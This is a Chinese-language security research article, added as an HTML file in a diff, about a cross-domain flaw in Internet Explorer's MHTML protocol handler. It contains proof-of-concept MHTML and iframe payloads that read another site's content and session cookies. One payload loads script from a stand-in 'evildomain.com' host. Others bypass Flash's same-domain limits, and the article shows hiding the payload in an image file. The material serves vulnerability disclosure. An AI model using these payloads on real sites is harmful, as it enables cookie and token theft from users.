@@ -1,0 +1,267 @@
+﻿<html>
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type">		
+<title>IE下MHTML协议带来的跨域危害</title>
+</head>
+<body>
+<h4>IE下MHTML协议带来的跨域危害</h4>
+<pre style="width: 100%; word-wrap:break-word;">
+Author: 暗夜潜风
+Baidu hi: d4rkwind
+Email: mere#vip.qq.com
+Site: http://hi.baidu.com/d4rkwind/
+
+
+[目录]
+
+0x00 背景
+0x01 MHTML
+0x02 跨域POC
+0x03 安全问题
+0x04 深入利用
+0x05 后话
+
+
+0x00 背景
+
+    MHTML，即MIME HTML，是由RFC 2557定义的，把一个多附件（如图片，flash动画等）的
+网页内容都保存到单一档案的标准。这个标准由微软提出，并从IE 5.0对其开始支持。
+    
+    同时，微软实现了MHTML协议，默认安装的window系统都带有MHTML协议处理程序（MHTML 
+Protocol Handler）。在IE中，当嵌入资源的URL的协议为 MHTML 时，IE将调用MHTML Protocol 
+Handler，把该资源当作MHTML格式文件解析处理。
+
+    MHTML Protocol Handler解析MHTML格式文件，其结果交给IE渲染，不可避免的将涉及跨
+域、脚本访问权限等安全问题。在此过程中，IE一旦处理不当，则会产生跨域漏洞。
+
+    基于上述的想法，我们对MHTML协议做了一系列跨域安全测试。
+
+
+0x01 MHTML
+
+    根据RFC 2557等，MHTML文件格式举例如下：
+    注：与文件后缀名无关，且假设URL:http://trusteddomain.com/demo.html
+
+--code-------------------------------------------------------------------------    
+Content-Type: multipart/related; boundary=&quot;_boundary_by_mere&quot;
+
+--_boundary_by_mere
+Content-Location:demo
+Content-Transfer-Encoding:base64
+
+PGh0bWw+PGJvZHk+TUhUTUwgREVNTyE8L2JvZHk+PC9odG1sPg==
+--_boundary_by_mere—
+-------------------------------------------------------------------------------
+
+    IE下访问MHTML:http://trusteddomain.com/demo.html!demo ，MHTML Protocol Handler
+根据Content-Location值找到对应的数据块，再根据Content-Transfer-Encoding值对一下这段
+base64数据解码：
+
+PGh0bWw+PGJvZHk+TUhUTUwgREVNTyE8L2JvZHk+PC9odG1sPg==
+
+    最后IE解析内容为对应的“&lt;html&gt;&lt;body&gt;MHTML DEMO!&lt;/body&gt;&lt;/html&gt;”。（注：demo中IE
+吞掉末尾字符的情况不会影响本文结论。）
+
+    同样，我们构造URL: http://evildomain.com/mhtml.html，其html代码为：
+
+--code------------------------------------------------------------------------- 
+&lt;iframe src=&quot;MHTML:http://trusteddomain.com/demo.html!demo&quot;&gt;&lt;/iframe&gt;
+-------------------------------------------------------------------------------
+
+    IE下访问该http://evildomain.com/mhtml.html，效果类似。
+    
+
+0x02 跨域POC
+
+    由0x01知，IE正确读取 MHTML:http://trusteddomain.com/demo.html!demo对应的HTML
+代码并渲染。但若HTML源码中包含脚本，其属于什么域，有什么权限，符合同源策略么？
+
+    经过测试，我们得到下面两个POC（如需测试，请改host文件）：
+    
+    POC 01：利用MHTML跨域ajax请求
+    
+    URL：http://trusteddomain.com/demo.html的代码为:
+
+--code-------------------------------------------------------------------------  
+Content-Type: multipart/related; boundary=&quot;_boundary_by_mere&quot;
+
+--_boundary_by_mere
+Content-Location:ajax
+Content-Transfer-Encoding:base64
+
+PGJvZHk+DQo8c2NyaXB0IHNyYz1odHRwOi8vZXZpbGRvbWFpbi5jb20veG1saHR0cC5qcz48L3NjcmlwdD4NCjxzY3JpcHQ+DQp2YXIgeG1sSHR0cCA9IGNyZWF0ZVhtbEh0dHBSZXF1ZXN0KCk7DQp2YXIgdXJsPSJodHRwOi8vdHJ1c3RlZGRvbWFpbi5jb20vIjsNCnhtbEh0dHAub3BlbigiZ2V0IiwgdXJsLCBmYWxzZSk7DQp4bWxIdHRwLnNlbmQobnVsbCk7DQphbGVydCgiVHJ1c3RlZGRvbWFpbi5jb20ncyBpbm5lckhUTUwgaXMgIit4bWxIdHRwLnJlc3BvbnNlVGV4dCk7DQo8L3NjcmlwdD4NCjwvYm9keT4NCg==
+--_boundary_by_mere--
+------------------------------------------------------------------------------
+
+    其中base64原文为：
+
+--code------------------------------------------------------------------------- 
+&lt;body&gt;
+&lt;script src=http://evildomain.com/xmlhttp.js&gt;&lt;/script&gt;
+&lt;script&gt;
+var xmlHttp = createXmlHttpRequest();
+var url=&quot;http://trusteddomain.com/&quot;;
+xmlHttp.open(&quot;get&quot;, url, false);
+xmlHttp.send(null);
+alert(&quot;Trusteddomain.com&#34;s innerHTML is &quot;+xmlHttp.responseText);
+&lt;/script&gt;
+&lt;/body&gt;
+-------------------------------------------------------------------------------
+
+    其中http://evildomain.com/xmlhttp.js为创建XMLHttp对象的方法定义。
+    
+    URL: http://evildomain.com/mhtml.html，其html代码为：
+
+--code------------------------------------------------------------------------- 
+&lt;iframe src=&quot;MHTML:http://trusteddomain.com/demo.html!ajax&quot;&gt;&lt;/iframe&gt;
+-------------------------------------------------------------------------------
+
+    IE访问http://evildomain.com/mhtml.html，WinXP+IE8弹出了http://trusteddomain.com/
+域下的内容，即IE认为MHTML:http://trusteddomain.com/demo.html!ajax和http://trusteddomain.com/
+同源。Win7+IE8提示没有权限，似乎做了安全限制，但通过下述方法，仍然可以绕过：
+
+--code-------------------------------------------------------------------------
+&lt;iframe src=&quot;MHTML:http://trusteddomain.com/demo.html!ajax&quot;&gt;&lt;/iframe&gt;
+&lt;script&gt;
+setTimeout(&#34;window.location=&quot;http://evildomain.com/mhtml.html&quot;&#34;,3000);
+//win 7 + ie8，如setTimeout(&#34;window.location.reload()&#34;,3000)等方法也可以
+&lt;/script&gt;
+-------------------------------------------------------------------------------
+
+    POC 02：利用MHTML获取cookie
+
+    URL：http://trusteddomain.com/demo.html的代码为:
+
+--code-------------------------------------------------------------------------
+Content-Type: multipart/related; boundary=&quot;_boundary_by_mere&quot;
+
+--_boundary_by_mere
+Content-Location:cookie
+Content-Transfer-Encoding:base64
+
+PGJvZHk+DQo8aWZyYW1lIGlkPWlmciBzcmM9Imh0dHA6Ly90cnVzdGVkZG9tYWluLmNvbS8iPjwvaWZyYW1lPg0KPHNjcmlwdD4NCmZ1bmN0aW9uIGNyb3NzY29va2llKCl7DQppZnIgPSBpZnIuY29udGVudFdpbmRvdyA/IGlmci5jb250ZW50V2luZG93IDogaWZyLmNvbnRlbnREb2N1bWVudDsNCmFsZXJ0KGlmci5kb2N1bWVudC5jb29raWUpDQp9DQpzZXRUaW1lb3V0KCJjcm9zc2Nvb2tpZSgpIiwxMDAwKTsNCjwvc2NyaXB0PjwvYm9keT4NCg==
+--_boundary_by_mere--
+-------------------------------------------------------------------------------
+
+    其中base64原文为：
+
+--code-------------------------------------------------------------------------
+&lt;body&gt;
+&lt;iframe id=ifr src=&quot;http://trusteddomain.com/&quot;&gt;&lt;/iframe&gt;
+&lt;script&gt;
+function crosscookie(){
+ifr = ifr.contentWindow ? ifr.contentWindow : ifr.contentDocument;
+alert(ifr.document.cookie)
+}
+setTimeout(&quot;crosscookie()&quot;,1000);
+&lt;/script&gt;&lt;/body&gt;
+-------------------------------------------------------------------------------
+
+    URL：http://evildomain.com/mhtml.html，其html代码为：
+    
+--code-------------------------------------------------------------------------    
+&lt;iframe src=&quot;MHTML:http://trusteddomain.com/demo.html!cookie&quot;&gt;&lt;/iframe&gt;
+-------------------------------------------------------------------------------
+
+    IE访问http://evildomain.com/mhtml.html，弹出trusteddomain.com下的会话cookie。
+    
+
+0x03 安全问题
+
+    浏览器的同源策略，即同协议、同域名、同端口，其阻止了脚本读取其他站点的内容。
+但由0x02，我们发现IE“认为”MHTML：http://trusteddomain.com/demo.html!cookie和
+http://trusteddomain.com满足同源策略。此外，我们针对MHTML:ftp://做了类似测试，最
+终推测：MHTML协议场景，IE取mhtml协议后的协议，即http（ftp）与trusteddomain.com的
+http作同源验证，而非MHTML:http与http。这就导致了IE下跨域漏洞的产生。
+
+    那能否跨到本地域呢？
+
+    经过我们的测试，我们发现“iframe src=mhtml:本地文件”这种方式，由于iframe本
+身的安全限制，mhtml无法通过其跨域获得本地文件的内容，从而无法利用，但iframe是允
+许通过uac引入本地文件的，POC如下：（这里的file://127.0.0.1/c$/ajax.html 里的代码
+不再贴出）
+
+    URL：http://evildomain.com/mhtml.html，其html代码为：
+    
+--code-------------------------------------------------------------------------
+&lt;iframe src=&quot;mhtml:file://127.0.0.1/c$/ajax.html!ajax&quot;&gt;&lt;/iframe&gt;
+-------------------------------------------------------------------------------
+
+    根据下文0x04，寻找IE可控的本地可插文件，如index.dat，将成为攻击关注的点，这
+里不多作叙述。
+    
+    除此之外，我们也发现，利用MHTML可以成功绕过flash的AllowScriptAccess=sameDomain
+和crossdomain.xml 的安全限制。下例中，http://trusteddomain.com/flash.html 允许用
+户插入flash，但限制AllowScriptAccess为默认的sameDomain，且trusteddomain.com的
+crossdomain.xml中，设置allow-access-from domain 为trusteddomain.com。
+
+    综合的POC如下：（这里的http://trusteddomain.com/demo.html里的代码不再贴出）
+    
+    URL：http://trusteddomain.com/flash.html，其html代码为：
+
+--code-------------------------------------------------------------------------
+&lt;embed 
+	type=&quot;application/x-shockwave-flash&quot;
+	src=&quot;mhtml:http://trusteddomain.com/demo.html!demo.swf&quot;
+	allowNetworking=all
+	AllowScriptAccess=samedomain
+	width=500
+	height=500&gt;
+&lt;/embed&gt;
+-------------------------------------------------------------------------------
+
+    IE下访问http://trusteddomain.com/flash.html，我们可控的“flash”文件demo.swf
+成功与trusteddomain.com进行交互和通讯。
+
+    溯本求源，参考MSDN的文档About Asynchronous Pluggable Protocols，我们发现，
+MHTML本身功能类似MIME sniff，解释MIME内容后再交给IE去处理，即HTTP=》MHTML=》IE。
+但最终IE在处理内容时，因为在IE看来内容本质上来源HTTP，便认为其域为HTTP所在域。这
+本身看上去还真的无可厚非，但却可被利用导致跨域。
+
+
+0x04 深入利用
+
+    由0x01-0x03知，这个漏洞的利用需要攻击者能控制一个被攻击域trusteddomain.com下
+的某个页面部分内容或某个文件，且需要按照MHTML格式插入攻击代码。根据我们的测试，
+我们同时发现MHTML Protocol Handler 对MHTML文件有如下“温和”之处：
+
+    1. MHTML Protocol Handler会忽略远程文件后缀；
+    2. MHTML Protocol Handler会忽略远程文件中Content-Type前面的除“空行”外的所有内容，
+若有“空行”，则MHTML Protocol Handler不能解释该文件；
+    3. MHTML Protocol Handler会忽略远程文件中“--_boundary_by_mere—”后的所有无关内容；
+    4. MHTML Protocol Handler会忽略远程服务器的Content-Disposition、X-Frame-Options等响应头。
+
+    因此，攻击者只需在任意满足以上条件的文件/页面里，按照MHTML格式插入针对被攻击
+域（trusteddomain.com）的跨域内容。比如，把包含恶意内容的文件上传到trusteddomain.com
+域下，甚至只需在某些页面发表MHTML格式的留言（mhtml string injection，可参考twitter 
+css string injection）。并且，即使服务端对这类附件添加Content-Disposition下载响
+应头，也可以被利用。或者，即使服务端检查图片信息，也可以通过如cmd下copy /b 1.jpg 
++ 1.txt 2.jpg等方式把利用代码附加到的图片里绕过此类防御（见附件）。
+
+    通过上述利用，trusteddomain.com用户访问了evildomain.com后，攻击者可以轻易得
+到trusteddomain.com下用户敏感内容（如token），获取用户数据，甚至获取用户在
+trusteddomain.com的cookie。
+
+    如此，此漏洞将危害许多网站，尤其是只启用单个域名的中小论坛，另外，即使是存在
+多个二级域名的站点，由于通常情况下，其统一身份认证所用的cookie都限制在trusteddomain.com
+下，也会该漏洞受影响。
+
+
+0x05 后话
+
+    对IE MHTML协议跨域漏洞的测试和描述就写到这里，在撰写此文时，我们对相关历史漏
+洞的搜索发现，历来的mhtml相关被补的漏洞，或多或少其实都存在这个漏洞的影子。此外，
+在把本文投递到webzine时，经过与黑哥交流得知 http://heideri.ch/jso/#98 或多或少提
+及到了本文的poc。
+
+    由于在撰写本文时，能够参考的官方文档较少，部分结论由测试的结果推测得出，感谢
+剑心、wofeiwo、黑哥对本文提出的建设性意见。且我们的测试环境主要以win7+ie8为主，
+以win xp+ie8/ie6 为辅，难免会有不足和错误，如果您发现有误，或有其他疑问，欢迎与
+我讨论，我的百度hi为：d4rkwind。
+<pre>
+<a href="attachment/IE下MHTML协议带来的跨域危害.rar">附件下载</a>
+<pre>
+-EOF-
+</pre>
+</body>
+</html>
